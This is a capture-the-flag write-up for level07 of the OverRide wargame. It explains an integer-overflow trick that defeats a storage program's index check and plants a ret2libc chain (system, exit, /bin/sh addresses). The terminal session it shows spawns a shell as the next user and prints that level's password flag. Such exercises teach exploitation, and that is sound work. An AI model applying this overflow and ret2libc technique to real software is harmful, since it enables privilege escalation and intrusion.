# level07

In this level, we have an executable that handle different commands
- store
- read
- quit

We have an info
>wil has reserved some storage

While checking the binary with ghidra, we can see a that we can't store any multiple of 3

We will find the buffer size, explains have been made in [gdb writeup](Ressources/gdbwriteup.md)

At the end of the buffer, we will store the 3 different addresses of system, exit and /bin/sh

so at index 114, 115, 116 (not 456, 457, 458 because we are storing integers)

We can't store at 114 because it's a multiple of 3, so we will do an integer overflow to store at 114

4294967296 / 4 + 114 = 1073741938

so at the end, we will store at index 1073741938, 1073741939, 1073741940

| Index | Value |
|-------|-------|
| 1073741938 | 4159090384 |
| 1073741939 | 4159040368 |
| 116 | 4160264172 |

```bash
level07@OverRide:~$ ./level07
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 1073741939
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 1073741940
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```